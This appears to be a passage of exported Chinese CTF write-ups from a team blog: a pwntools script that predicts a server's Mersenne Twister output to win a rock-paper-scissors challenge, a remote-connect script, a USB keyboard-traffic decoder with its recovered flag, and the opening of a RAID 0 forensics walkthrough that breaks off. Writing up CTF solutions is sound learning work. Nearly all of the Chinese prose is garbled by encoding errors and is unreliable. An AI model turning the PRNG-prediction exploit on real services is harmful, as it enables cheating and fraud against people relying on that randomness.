‡è¯†ç¬¦)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark == 0: taolve.sendline(\u0026#34;å¸ƒ\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†å¸ƒ\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;çŸ³å¤´\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†çŸ³å¤´\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;å‰ªåˆ€\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†å‰ªåˆ€\u0026#34;) #==============æœ€åä¸€å±€ï¼Œè®¤çœŸæ¨¡å¼ï¼š================== answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) taolve.sendline(b\u0026#34;1\u0026#34;) for i in range(512): éšæœºæ•° = rc.predict_getrandbits(32) mark = éšæœºæ•° % 3 è½®æ ‡è¯†ç¬¦ = (éšæœºæ•° // 3) ^ hhh[mark] print(\u0026#34;é¢„æµ‹ï¼š\u0026#34;) print(hex(è½®æ ‡è¯†ç¬¦)[2:].zfill(8)) answer = taolve.recvuntil(b\u0026#39;\u0026gt; \u0026#39;) print(answer.decode(\u0026#39;utf-8\u0026#39;)) if mark == 0: taolve.sendline(\u0026#34;å¸ƒ\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†å¸ƒ\u0026#34;) if mark == 1: taolve.sendline(\u0026#34;çŸ³å¤´\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†çŸ³å¤´\u0026#34;) if mark == 2: taolve.sendline(\u0026#34;å‰ªåˆ€\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;æˆ‘å‡ºäº†å‰ªåˆ€\u0026#34;) taolve.interactive() è¿è¡Œç»“æœï¼š ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/10_chisato_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Chisato"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rå…ˆ nc ä¸€ä¸‹ï¼Œæç¤ºåœ¨shadowä¸­å¯»æ‰¾flag ç¬¬ä¸€ååº”æ˜¯å†™ä¸€ä¸ªremoteè¿œç¨‹è¿æ¥è„šæœ¬çœ‹çœ‹ä»–æ˜¯ä¸æ˜¯å‘äº†æœªæ˜¾ç¤ºçš„å­—èŠ‚è¿‡æ¥ ä»£ç å¦‚ä¸‹ï¼š\nfrom pwn import * context.log_level = \u0026#39;debug\u0026#39; #debugæ¨¡å¼ä¸‹å¯ä»¥æ¸…é™¤åœ°çœ‹åˆ°ä»–å‘é€çš„å­—èŠ‚ taolve = remote(\u0026#39;ctf.w4terdr0p.team\u0026#39;, 47389) taolve.interactive() å¯ä»¥çœ‹åˆ°flagå­—èŠ‚ï¼š å…³é—­debugæ¨¡å¼æ–¹ä¾¿æœé›†flag: ","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/8_shadow_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-Shadow"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\rç”¨wiresharkåˆ†æäº†ä¸€ä¸‹æµé‡åŒ…åå‘ç°æ˜¯usbçš„é”®ç›˜æµé‡ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†ä¸€äº›ç°æˆçš„è„šæœ¬ï¼Œä½†æ˜¯æœ‰ä¸€äº›æ•ˆæœä¸å¤ªå¥½ï¼Œæœ€åé€‰æ‹©äº†ä¸‹é¢çš„è¿™ä¸ªè„šæœ¬ï¼ŒæˆåŠŸè·‘å‡ºäº†ç¬¬ä¸€é˜¶æ®µçš„ flag pythonè„šæœ¬å¦‚ä¸‹ï¼š\n#!/usr/bin/env python # coding:utf-8 import argparse import os from tempfile import NamedTemporaryFile BOOT_KEYBOARD_MAP = { 0x00: (None, None), # Reserved (no event indicated) 0x01: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorRollOver 0x02: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # POSTFail 0x03: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # ErrorUndefined 0x04: (\u0026#39;a\u0026#39;, \u0026#39;A\u0026#39;), # a 0x05: (\u0026#39;b\u0026#39;, \u0026#39;B\u0026#39;), # b 0x06: (\u0026#39;c\u0026#39;, \u0026#39;C\u0026#39;), # c 0x07: (\u0026#39;d\u0026#39;, \u0026#39;D\u0026#39;), # d 0x08: (\u0026#39;e\u0026#39;, \u0026#39;E\u0026#39;), # e 0x09: (\u0026#39;f\u0026#39;, \u0026#39;F\u0026#39;), # f 0x0a: (\u0026#39;g\u0026#39;, \u0026#39;G\u0026#39;), # g 0x0b: (\u0026#39;h\u0026#39;, \u0026#39;H\u0026#39;), # h 0x0c: (\u0026#39;i\u0026#39;, \u0026#39;I\u0026#39;), # i 0x0d: (\u0026#39;j\u0026#39;, \u0026#39;J\u0026#39;), # j 0x0e: (\u0026#39;k\u0026#39;, \u0026#39;K\u0026#39;), # k 0x0f: (\u0026#39;l\u0026#39;, \u0026#39;L\u0026#39;), # l 0x10: (\u0026#39;m\u0026#39;, \u0026#39;M\u0026#39;), # m 0x11: (\u0026#39;n\u0026#39;, \u0026#39;N\u0026#39;), # n 0x12: (\u0026#39;o\u0026#39;, \u0026#39;O\u0026#39;), # o 0x13: (\u0026#39;p\u0026#39;, \u0026#39;P\u0026#39;), # p 0x14: (\u0026#39;q\u0026#39;, \u0026#39;Q\u0026#39;), # q 0x15: (\u0026#39;r\u0026#39;, \u0026#39;R\u0026#39;), # r 0x16: (\u0026#39;s\u0026#39;, \u0026#39;S\u0026#39;), # s 0x17: (\u0026#39;t\u0026#39;, \u0026#39;T\u0026#39;), # t 0x18: (\u0026#39;u\u0026#39;, \u0026#39;U\u0026#39;), # u 0x19: (\u0026#39;v\u0026#39;, \u0026#39;V\u0026#39;), # v 0x1a: (\u0026#39;w\u0026#39;, \u0026#39;W\u0026#39;), # w 0x1b: (\u0026#39;x\u0026#39;, \u0026#39;X\u0026#39;), # x 0x1c: (\u0026#39;y\u0026#39;, \u0026#39;Y\u0026#39;), # y 0x1d: (\u0026#39;z\u0026#39;, \u0026#39;Z\u0026#39;), # z 0x1e: (\u0026#39;1\u0026#39;, \u0026#39;!\u0026#39;), # 1 0x1f: (\u0026#39;2\u0026#39;, \u0026#39;@\u0026#39;), # 2 0x20: (\u0026#39;3\u0026#39;, \u0026#39;#\u0026#39;), # 3 0x21: (\u0026#39;4\u0026#39;, \u0026#39;$\u0026#39;), # 4 0x22: (\u0026#39;5\u0026#39;, \u0026#39;%\u0026#39;), # 5 0x23: (\u0026#39;6\u0026#39;, \u0026#39;^\u0026#39;), # 6 0x24: (\u0026#39;7\u0026#39;, \u0026#39;\u0026amp;\u0026#39;), # 7 0x25: (\u0026#39;8\u0026#39;, \u0026#39;*\u0026#39;), # 8 0x26: (\u0026#39;9\u0026#39;, \u0026#39;(\u0026#39;), # 9 0x27: (\u0026#39;0\u0026#39;, \u0026#39;)\u0026#39;), # 0 0x28: (\u0026#39;\\n\u0026#39;, \u0026#39;\\n\u0026#39;), # Return (ENTER) 0x29: (\u0026#39;[ESC]\u0026#39;, \u0026#39;[ESC]\u0026#39;), # Escape 0x2a: (\u0026#39;\\b\u0026#39;, \u0026#39;\\b\u0026#39;), # Backspace 0x2b: (\u0026#39;\\t\u0026#39;, \u0026#39;\\t\u0026#39;), # Tab 0x2c: (\u0026#39; \u0026#39;, \u0026#39; \u0026#39;), # Spacebar 0x2d: (\u0026#39;-\u0026#39;, \u0026#39;_\u0026#39;), # - 0x2e: (\u0026#39;=\u0026#39;, \u0026#39;+\u0026#39;), # = 0x2f: (\u0026#39;[\u0026#39;, \u0026#39;{\u0026#39;), # [ 0x30: (\u0026#39;]\u0026#39;, \u0026#39;}\u0026#39;), # ] 0x31: (\u0026#39;\\\\\u0026#39;, \u0026#39;|\u0026#39;), # \\ 0x32: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US # and ~ 0x33: (\u0026#39;;\u0026#39;, \u0026#39;:\u0026#39;), # ; 0x34: (\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;), # \u0026#39; 0x35: (\u0026#39;`\u0026#39;, \u0026#39;~\u0026#39;), # ` 0x36: (\u0026#39;,\u0026#39;, \u0026#39;\u0026lt;\u0026#39;), # , 0x37: (\u0026#39;.\u0026#39;, \u0026#39;\u0026gt;\u0026#39;), # . 0x38: (\u0026#39;/\u0026#39;, \u0026#39;?\u0026#39;), # / 0x39: (\u0026#39;[CAPSLOCK]\u0026#39;, \u0026#39;[CAPSLOCK]\u0026#39;), # Caps Lock 0x3a: (\u0026#39;[F1]\u0026#39;, \u0026#39;[F1]\u0026#39;), # F1 0x3b: (\u0026#39;[F2]\u0026#39;, \u0026#39;[F2]\u0026#39;), # F2 0x3c: (\u0026#39;[F3]\u0026#39;, \u0026#39;[F3]\u0026#39;), # F3 0x3d: (\u0026#39;[F4]\u0026#39;, \u0026#39;[F4]\u0026#39;), # F4 0x3e: (\u0026#39;[F5]\u0026#39;, \u0026#39;[F5]\u0026#39;), # F5 0x3f: (\u0026#39;[F6]\u0026#39;, \u0026#39;[F6]\u0026#39;), # F6 0x40: (\u0026#39;[F7]\u0026#39;, \u0026#39;[F7]\u0026#39;), # F7 0x41: (\u0026#39;[F8]\u0026#39;, \u0026#39;[F8]\u0026#39;), # F8 0x42: (\u0026#39;[F9]\u0026#39;, \u0026#39;[F9]\u0026#39;), # F9 0x43: (\u0026#39;[F10]\u0026#39;, \u0026#39;[F10]\u0026#39;), # F10 0x44: (\u0026#39;[F11]\u0026#39;, \u0026#39;[F11]\u0026#39;), # F11 0x45: (\u0026#39;[F12]\u0026#39;, \u0026#39;[F12]\u0026#39;), # F12 0x46: (\u0026#39;[PRINTSCREEN]\u0026#39;, \u0026#39;[PRINTSCREEN]\u0026#39;), # Print Screen 0x47: (\u0026#39;[SCROLLLOCK]\u0026#39;, \u0026#39;[SCROLLLOCK]\u0026#39;), # Scroll Lock 0x48: (\u0026#39;[PAUSE]\u0026#39;, \u0026#39;[PAUSE]\u0026#39;), # Pause 0x49: (\u0026#39;[INSERT]\u0026#39;, \u0026#39;[INSERT]\u0026#39;), # Insert 0x4a: (\u0026#39;[HOME]\u0026#39;, \u0026#39;[HOME]\u0026#39;), # Home 0x4b: (\u0026#39;[PAGEUP]\u0026#39;, \u0026#39;[PAGEUP]\u0026#39;), # Page Up 0x4c: (\u0026#39;[DELETE]\u0026#39;, \u0026#39;[DELETE]\u0026#39;), # Delete Forward 0x4d: (\u0026#39;[END]\u0026#39;, \u0026#39;[END]\u0026#39;), # End 0x4e: (\u0026#39;[PAGEDOWN]\u0026#39;, \u0026#39;[PAGEDOWN]\u0026#39;), # Page Down 0x4f: (\u0026#39;[RIGHTARROW]\u0026#39;, \u0026#39;[RIGHTARROW]\u0026#39;), # Right Arrow 0x50: (\u0026#39;[LEFTARROW]\u0026#39;, \u0026#39;[LEFTARROW]\u0026#39;), # Left Arrow 0x51: (\u0026#39;[DOWNARROW]\u0026#39;, \u0026#39;[DOWNARROW]\u0026#39;), # Down Arrow 0x52: (\u0026#39;[UPARROW]\u0026#39;, \u0026#39;[UPARROW]\u0026#39;), # Up Arrow 0x53: (\u0026#39;[NUMLOCK]\u0026#39;, \u0026#39;[NUMLOCK]\u0026#39;), # Num Lock 0x54: (\u0026#39;[KEYPADSLASH]\u0026#39;, \u0026#39;/\u0026#39;), # Keypad / 0x55: (\u0026#39;[KEYPADASTERISK]\u0026#39;, \u0026#39;*\u0026#39;), # Keypad * 0x56: (\u0026#39;[KEYPADMINUS]\u0026#39;, \u0026#39;-\u0026#39;), # Keypad - 0x57: (\u0026#39;[KEYPADPLUS]\u0026#39;, \u0026#39;+\u0026#39;), # Keypad + 0x58: (\u0026#39;[KEYPADENTER]\u0026#39;, \u0026#39;[KEYPADENTER]\u0026#39;), # Keypad ENTER 0x59: (\u0026#39;[KEYPAD1]\u0026#39;, \u0026#39;1\u0026#39;), # Keypad 1 and End 0x5a: (\u0026#39;[KEYPAD2]\u0026#39;, \u0026#39;2\u0026#39;), # Keypad 2 and Down Arrow 0x5b: (\u0026#39;[KEYPAD3]\u0026#39;, \u0026#39;3\u0026#39;), # Keypad 3 and PageDn 0x5c: (\u0026#39;[KEYPAD4]\u0026#39;, \u0026#39;4\u0026#39;), # Keypad 4 and Left Arrow 0x5d: (\u0026#39;[KEYPAD5]\u0026#39;, \u0026#39;5\u0026#39;), # Keypad 5 0x5e: (\u0026#39;[KEYPAD6]\u0026#39;, \u0026#39;6\u0026#39;), # Keypad 6 and Right Arrow 0x5f: (\u0026#39;[KEYPAD7]\u0026#39;, \u0026#39;7\u0026#39;), # Keypad 7 and Home 0x60: (\u0026#39;[KEYPAD8]\u0026#39;, \u0026#39;8\u0026#39;), # Keypad 8 and Up Arrow 0x61: (\u0026#39;[KEYPAD9]\u0026#39;, \u0026#39;9\u0026#39;), # Keypad 9 and Page Up 0x62: (\u0026#39;[KEYPAD0]\u0026#39;, \u0026#39;0\u0026#39;), # Keypad 0 and Insert 0x63: (\u0026#39;[KEYPADPERIOD]\u0026#39;, \u0026#39;.\u0026#39;), # Keypad . and Delete 0x64: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Non-US \\ and | 0x65: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Application 0x66: (\u0026#39;\u0026#39;, \u0026#39;\u0026#39;), # Power 0x67: (\u0026#39;[KEYPADEQUALS]\u0026#39;, \u0026#39;=\u0026#39;), # Keypad = 0x68: (\u0026#39;[F13]\u0026#39;, \u0026#39;[F13]\u0026#39;), # F13 0x69: (\u0026#39;[F14]\u0026#39;, \u0026#39;[F14]\u0026#39;), # F14 0x6a: (\u0026#39;[F15]\u0026#39;, \u0026#39;[F15]\u0026#39;), # F15 0x6b: (\u0026#39;[F16]\u0026#39;, \u0026#39;[F16]\u0026#39;), # F16 0x6c: (\u0026#39;[F17]\u0026#39;, \u0026#39;[F17]\u0026#39;), # F17 0x6d: (\u0026#39;[F18]\u0026#39;, \u0026#39;[F18]\u0026#39;), # F18 0x6e: (\u0026#39;[F19]\u0026#39;, \u0026#39;[F19]\u0026#39;), # F19 0x6f: (\u0026#39;[F20]\u0026#39;, \u0026#39;[F20]\u0026#39;), # F20 0x70: (\u0026#39;[F21]\u0026#39;, \u0026#39;[F21]\u0026#39;), # F21 0x71: (\u0026#39;[F22]\u0026#39;, \u0026#39;[F22]\u0026#39;), # F22 0x72: (\u0026#39;[F23]\u0026#39;, \u0026#39;[F23]\u0026#39;), # F23 0x73: (\u0026#39;[F24]\u0026#39;, \u0026#39;[F24]\u0026#39;), # F24 } def parse_boot_keyboard_report(data: bytearray): # æ•°æ®è§£æå‡½æ•° modifiers = data[0] # ä¿®æ”¹é”®å­—èŠ‚ keys = data[2:8] # é”®ç å­—èŠ‚ # å°†ä¿®æ”¹é”®å­—èŠ‚ä¸­çš„ä½è§£ç ä¸ºæŒ‰é”®ä¿®é¥°ç¬¦ ctrl = (modifiers \u0026amp; 0x11) != 0 shift = (modifiers \u0026amp; 0x22) != 0 alt = (modifiers \u0026amp; 0x44) != 0 gui = (modifiers \u0026amp; 0x88) != 0 # è§£æé”®ç å­—èŠ‚å¹¶å°†å…¶æ˜ å°„ä¸ºå­—ç¬¦ characters = [] for key in keys: if key != 0: # é”®ç ä¸ä¸º0åˆ™æŸ¥è¯¢æ˜ å°„è¡¨ if key in BOOT_KEYBOARD_MAP: characters.append(BOOT_KEYBOARD_MAP[key][shift]) else: characters.append(None) return (ctrl, shift, alt, gui, characters) def help_formatter(prog): return argparse.HelpFormatter(prog, max_help_position=40) def main(): # è§£æå‘½ä»¤è¡Œå‚æ•° parser = argparse.ArgumentParser( description=\u0026#39;Parse keyboard report data and output as text\u0026#39;, formatter_class=help_formatter) parser.add_argument(\u0026#39;pcapng_file\u0026#39;, help=\u0026#39;path to the pcapng file\u0026#39;) args = parser.parse_args() # é€šè¿‡tsharkè§£æpcapngæ–‡ä»¶ï¼Œè·å–é”®ç›˜æ•°æ®åŒ… # éœ€è¦å…ˆå®‰è£…wiresharkï¼Œå¹¶ä¸”æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ tmpfile = NamedTemporaryFile(delete=False) tmpfile.close() command = \u0026#34;tshark -r %s -T fields -e usbhid.data -e usb.capdata \u0026gt; %s\u0026#34; % ( args.pcapng_file, tmpfile.name) os.system(command) with open(tmpfile.name, \u0026#39;r\u0026#39;) as f: lines = f.readlines() os.unlink(tmpfile.name) # è§£æé”®ç›˜æ•°æ®åŒ…ï¼Œè·å–è¾“å…¥å­—ç¬¦ text = \u0026#34;\u0026#34; for line in lines: capdata = line.strip().replace(\u0026#39;:\u0026#39;, \u0026#39;\u0026#39;) if capdata: data = bytearray.fromhex(capdata) characters = parse_boot_keyboard_report(data)[-1] for character in characters: if character: text += character else: pass raw_text = repr(text) print(f\u0026#39;Raw output:\\n{raw_text}\u0026#39;) print(f\u0026#39;Text output:\\n{text}\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: main() è¿è¡Œç»“æœå¦‚ä¸‹ï¼š flagå¦‚ä¸‹ï¼š Ww4terCTF[CAPSLOCK]{[YOu_-@2r3_tH3_-[CAPSLOCK]MmaST3R_-o1+-USB-[CAPSLOCK]Ttr@2 f[CAPSLOCK]f!1C_-aN@2Iys!1s}]\nä¸€é˜¶æ®µflagç‰¹æ®Šç¬¦[CAPSLOCK]æœªåˆ é™¤ï¼ŒæŒ‰ç…§[CAPSLOCK]çš„è§„åˆ™å°†flagä¿®æ”¹ä¸€ä¸‹ï¼š Ww4terCTF{[yoU_-@2R3_Th3_-MmaST3R_-o1+-USB-tTR@Ff!1C_-aN@2Iys!1s}]\nè¿˜å¯ä»¥æ˜æ˜¾çœ‹å‡ºflagæœ‰å­—ç¬¦é‡å¤è¾“å…¥ï¼Œæ‰€ä»¥åˆ æ‰é‚£äº›æœ‰å¯èƒ½æ˜¯é‡å¤è¾“å…¥çš„å­—ç¬¦ï¼š W4terCTF{yoU_@R3_Th3_MaST3R_o1+_USB_tR@Ff!C_aN@Iys!s}\nä½†æ˜¯æäº¤flagçš„æ—¶å€™æ˜¾ç¤ºflagé”™è¯¯ï¼Œåˆ™å¯èƒ½æ˜¯ä¸€äº›å¤šä½™å­—ç¬¦æœªåˆ é™¤ï¼Œè¿™é‡Œæˆ‘ä»¬å‘ç°o1åé¢çš„ \u0026lsquo;+\u0026rsquo; å­—ç¬¦å¥½åƒæ˜¯å¤šä½™çš„ï¼Œåˆ é™¤åå¾—åˆ°ï¼š W4terCTF{yoU_@R3_Th3_MaST3R_o1_USB_tR@Ff!C_aN@Iys!s}\næäº¤ flagï¼Œæ­£ç¡®ï¼\n","date":"July 5, 2023","permalink":"/posts/wp/2023_04_ctf/9_usb-hacker_write_up/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003eæ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://ta0lve.github.io/posts/wp/2023_06_ciscn/\"   target=\"_blank\"\u003e\n    2023 ciscn åˆèµ› Â· ta0lve\u003c/a\u003e\u003c/p\u003e","title":"misc-USB Hacker"},{"content":"æ­¤æ–‡ç« ä»…é™æˆ˜é˜Ÿå†…éƒ¨æˆå‘˜é˜…è¯»\nè·¯è¿‡çš„å¸ˆå‚…ä»¬çœ‹çœ‹è¿œå¤„çš„wpå§ï¼š\n2023 ciscn åˆèµ› Â· ta0lve\næ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n--- DON'T MODIFY THIS LINE ---\ræœ¬é¢˜wpçš„ç»“æ„å¦‚ä¸‹ï¼šï¼ˆå‰æ’æç¤ºï¼Œè¯¥é¢˜wpæœ‰ç‚¹å¤šï¼‰\né¢˜ç›®æè¿° # â€‹\t2023 å¹´ 3 æœˆ 31 æ—¥åŠå¤œï¼Œæš´é›¨ã€‚ â€‹\tGZTime å‘ç°å·²ç»è·‘äº†?æ•´å¤©çš„ python è„šæœ¬æŒ‚äº†ï¼Œæ»¡çœ¼æ‰€è§çš†ä¸º IO Errorã€‚ â€‹\tã€Œåäº†ï¼æˆ‘è¿˜å¾—é è¿™ç©æ„äº¤ä½œä¸šï¼ã€ä»–æƒ³ï¼Œä¹‹åèµ¶å¿™å»æ£€æŸ¥äº†ä¸€ä¸‹ç¡¬ç›˜çš„æƒ…å†µâ€”â€”çœ‹èµ·æ¥æ•°æ®éƒ½æ­£å¸¸ï¼Œåªæ˜¯å¤§æ¦‚ç”±äºæš´é›¨çš„ç¼˜æ•…ï¼ˆbushiï¼‰å…³äº RAID çš„å…ƒä¿¡æ¯å…¨ä¸è§äº†â€”â€” è€Œ GZTime ä¹Ÿå¿˜è®°äº†å½“åˆç»„ RAID çš„æ—¶å€™çš„å„é¡¹å‚æ•°â€¦â€¦ä¸€ç•ªæœç´¢ï¼Œæ¢å¤æ•°æ®ä¼¼ä¹å¾—èŠ±ä¸å°‘é’±ï¼Œä½†æ˜¯ä»–å¬è¯´è¿™é‡Œä¼¼ä¹åœ¨åšä»€ä¹ˆå®‰å…¨ç›¸å…³çš„ä¸œè¥¿â€”â€”æˆ–è®¸ä½ èƒ½å¸®ä¸Šå¿™ï¼Ÿ\nä¸€ åˆ¤æ–­ç£ç›˜é¡ºåº # 1.åˆæ­¥åˆ†æ # å…ˆä¸‹è½½é™„ä»¶ï¼Œå‘ç°æ˜¯8 ä¸ªç£ç›˜æ–‡ä»¶ï¼Œ é¢˜ç›®çš„hintæç¤º:â€œè¿™ä¸€ç»„ç£ç›˜çš„ RAID ç±»å‹ä¸º RAID 0â€ï¼Œæ‰€ä»¥ç”¨æˆ‘ä»¬æœ€å¥½çš„æœ‹å‹â€”â€”æœç´¢å¼•æ“æ¥æœç´¢ç›¸å…³ä¿¡æ¯ï¼Œå¾—çŸ¥è¦æŠŠè¿™8ä¸ªç£ç›˜æ–‡ä»¶å½“ä½œä¸€ä¸ªé€»è¾‘å·æ¥è¯»å–è®¿é—®ã€‚ æ¥ç€å†æŸ¥æ‰¾ç»„è£…RAID 0 çš„æ–¹æ³•ï¼Œå‘ç°éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ¥ç»„è£…ï¼Œæ‰€ä»¥æ¶‰åŠåˆ°åˆ¤æ–­ç£ç›˜æ–‡ä»¶é¡ºåºçš„é—®é¢˜ã€‚ ä½†æ˜¯è¦å¦‚ä½•åˆ¤æ–­å‘¢ï¼Ÿåœ¨æœç´¢å¼•æ“æœç´¢å¾—åˆ°çš„ç­”æ¡ˆéƒ½ä¸å¤ªå¥½æ“ä½œï¼Œæœ€ååœ¨å‘ç° hackergame2021 çš„é˜µåˆ—æ¢å¤å¤§å¸ˆ ä¸€é¢˜ä¸æˆ‘ä»¬çš„é¢˜ç›®æœ‰ç€å…±é€šä¹‹å¤„ï¼Œäºæ˜¯å‚è€ƒ taokyå¸ˆå‚… çš„wp æ¥ç»„è£…æˆ‘ä»¬çš„ç£ç›˜ï¼Œ https://gitee.com/Scripter_doge/hackergame2021-writeups/blob/master/official/%E9%98%B5%E5%88%97%E6%81%A2%E5%A4%8D%E5%A4%A7%E5%B8%88/README.md # 2.ç¡®å®šé¦–å°¾æ–‡ä»¶ä¸å—çš„å¤§å° # å…ˆåœ¨è™šæ‹Ÿæœºé‡Œç”¨fileå‘½ä»¤æŸ¥çœ‹æˆ‘ä»¬çš„8ä¸ªæ˜ åƒæ–‡ä»¶ï¼Œ\nfile *.img å¾—åˆ°ï¼š å¯ä»¥çœ‹åˆ° UkAQZEahRpFP.img å†’å·åé¢æœ‰â€œDOSã€MBR boot sectorâ€ï¼Œæœ‰ MBR å¤´ï¼Œå¹¶ä¸”ç¬¬ä¸€å—åˆ†åŒº ID æ˜¯ 0xeeã€‚è¿™è¡¨æ˜æ•´å—ç£ç›˜å®é™…ä¸Šæ˜¯ GPT æ ¼å¼çš„ï¼Œå¹¶ä¸” UkAQZEahRpFP.img å°±æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€å—ç›˜ã€‚ æ¥ä¸‹æ¥è¦åˆ†æ GPT çš„å…ƒä¿¡æ¯ï¼Œå°†æ–‡ä»¶æ‹–åˆ°010editoræˆ–è€…å…¶ä»–åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ¥æŸ¥çœ‹ï¼Œå…·ä½“æ“ä½œç´§è·Ÿtaokyå¸ˆå‚…çš„é¢˜è§£ï¼š æˆ‘ä»¬ä½¿ç”¨çš„å‘½ä»¤ï¼š\n(echo \u0026#34;P5 1024 16384 255\u0026#34;; cat UkAQZEahRpFP.img) \u0026gt; ./UkAQZEahRpFP.pgm ç”¨Honeyviewæ‰“å¼€å›¾ç‰‡å¾—åˆ°ï¼š å‚è€ƒtaokyå¸ˆå‚…çš„é¢˜è§£ï¼š æˆ‘ä»¬ç£ç›˜å¯¹åº”çš„åå…­è¿›åˆ¶æ–‡æœ¬ï¼š ä½¿ç”¨å‘½ä»¤ï¼š\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;EFI PART\u0026#39;; done çœ‹çœ‹å¯èƒ½çš„å—è¾¹ç¼˜ï¼ˆ0x10000 = 64 KB çš„å€æ•°)çš„æƒ…å†µï¼š\nfor i in *.img; do echo $i \u0026amp;\u0026amp; hexdump -C $i | grep \u0026#39;0000 \u0026#39;; done \u0026gt; ./tmp1 ä½†æ˜¯å¹¶æ²¡æœ‰ä»€ä¹ˆæœ‰æ„æ€çš„å­—ç¬¦ä¸²ï¼Œæœ‰ç‚¹å°å¤±æœ› æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€è¿™8ä¸ªç£ç›˜æ–‡ä»¶ï¼Œå…ˆç”¨ctrl+F å°è¯•æœç´¢ä¸€äº›å­—ç¬¦ä¸²â€œflagâ€ã€â€œkeyâ€ã€â€œctfâ€ç­‰ç­‰ï¼Œï¼ˆç”¨ ctrl+shift+F å¤šæ–‡ä»¶æŸ¥æ‰¾æ›´æ–¹ä¾¿ï¼‰ï¼Œå‘ç°åœ¨BpStXfb7DgbO.imgå’ŒKESNic6iRwY3.imgæ–‡ä»¶ä¸­æœ‰è®¸å¤šçš„â€œflag.7zâ€å­—ç¬¦ä¸²ï¼Œçœ‹æ¥æˆ‘ä»¬çš„flagæœ€åä¼šåœ¨ä¸€ä¸ª7zå‹ç¼©åŒ…é‡Œã€‚ åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨è§‚å¯ŸUkAQZEahRpFP.imgçš„æ•°æ®ï¼Œå¯ä»¥æ˜æ˜¾å‘ç°ï¼š\n0x200000 å‰é¢çš„æ•°æ®è¢«æˆªæ–­äº†ï¼Œä»£è¡¨ 0x200000 æ˜¯å—å¤§å°çš„å€æ•°ï¼›\n0x200000 åˆ° 0x2c0000 æ˜¯æ˜æ˜¾è¿ç»­çš„æ•°æ®ï¼Œä¸­é—´æ²¡æœ‰è¢«æˆªæ–­ï¼›\n0x2c0000 